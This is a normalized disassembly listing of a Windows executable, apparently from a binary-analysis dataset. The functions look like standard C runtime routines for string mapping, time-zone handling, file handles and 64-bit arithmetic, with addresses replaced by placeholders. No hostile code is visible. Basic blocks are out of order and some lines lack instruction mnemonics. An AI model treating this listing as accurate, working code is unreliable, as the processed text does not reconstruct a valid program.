jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40c3fe
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40c430
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
dec edi
dec edi
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
inc esi
dec edi
jmp r-xdata
cmp esi edi
jae r-xdata
sub_40c460
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40c4db
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xb
call sub_409fbd
cmp [ rw-data ] 0x0
pop ecx
jne r-xdata
push 0xb
call sub_40a01e
pop ecx
call sub_40c509
inc [ rw-data ]
sub_40c509
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xc
pop edi
xor ebx ebx
push edi
mov [ ebp - 0x8 ] ebx
call sub_409fbd
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
mov [ rw-data ] ebx
mov [ esp ] r--data
call sub_40d8c5
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
call sub_40a01e
mov [ esp ] rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call sub_40a01e
pop ecx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bx
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_406c50
push esi
call sub_40c460
inc eax
push eax
call sub_406c98
add esp 0xc
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_406790
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_406430
push edi
call sub_40a01e
push 0x3
push esi
push [ rw-data ]
call sub_40d760
mov eax [ rw-data ]
add esi 0x3
add esp 0x18
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_406d24
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] 0x1
inc esi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ ebp - 0x4 ] ebx
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push 0x3f
mov edi 0x220
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x3f
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc esi
push esi
call sub_406d24
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
test eax eax
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_40d760
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_406d24
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_40c7b1
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_40c95d
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_40c95d
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_40c95d
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_40c95d
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_40c95d
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jge r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_40ca9d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_407830
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_406580
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_40cbf0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_409fbd
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_40a01e
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_40d98e
mov ebx eax
add esp 0x4
call sub_40d98e
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_40ccc0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_40d896
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_40bedc
pop esi
retn 0x4
sub_40cd24
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_40ab72
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x9
call sub_409fbd
push ebx
call sub_40a3c7
push 0x9
mov edi eax
call sub_40a01e
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_406580
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_40cdb1
inc [ rw-data ]
push 0x1000
call sub_406c98
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_40cdf5
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_40ce1e
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ce77
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_409fbd
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_40a01e
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40ce77
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_408122
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_40cee0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40cf50
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40cfc5
push ebx
push edi
push 0x2
xor ebx ebx
call sub_409fbd
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_40a01e
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_406858
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_406c50
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_40d046
push ecx
push ecx
push ebx
push ebp
push esi
push edi
push 0x12
or edi 0xffffffff
call sub_409fbd
xor ebx ebx
pop ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov ebp rw-data
mov esi 0x480
push esi
call sub_406c98
test eax eax
pop ecx
je r-xdata
lea eax [ esi + 0x480 ]
push 0x12
call sub_40a01e
pop ecx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
add [ rw-data ] 0x20
lea ecx [ ebx * 4 + rw-data ]
lea edx [ eax + 0x480 ]
mov [ ecx ] eax
add [ esp + 0x14 ] 0x20
add ebp 0x4
inc ebx
cmp ebp rw-data
mov [ esp + 0x10 ] ebx
jl r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl ebx 0x5
mov edi ebx
push edi
call sub_40d2a6
pop ecx
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x24
add edx esi
jmp r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp ]
add esi 0x24
add eax 0x480
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp eax edx
jae r-xdata
cmp esi eax
jae r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
push 0x11
call sub_409fbd
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
or [ esi ] 0xffffffff
mov eax esi
sub eax [ ebp ]
push 0x24
pop ecx
cdq
idiv ecx
mov edi eax
add edi [ esp + 0x14 ]
cmp edi 0xffffffff
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x10 ]
push 0x11
call sub_40a01e
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov ebx [ esp + 0x10 ]
sub_40d169
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_408122
mov [ eax ] 0x9
call sub_40812b
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
cmp [ eax + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40d1e5
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_408122
mov [ eax ] 0x9
call sub_40812b
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_40d264
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_408122
mov [ eax ] 0x9
call sub_40812b
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_40d2a6
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_409fbd
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_40a01e
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_40d327
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_408122
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_40d2a6
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_408122
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_40d264
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_40d305
pop ecx
mov eax esi
jmp r-xdata
call sub_40812b
mov [ eax ] esi
test esi esi
je r-xdata
sub_40d3ba
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
call sub_408122
mov [ eax ] 0x16
call sub_40812b
mov [ eax ] ebx
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_40d046
mov ebx eax
or edi 0xffffffff
cmp ebx edi
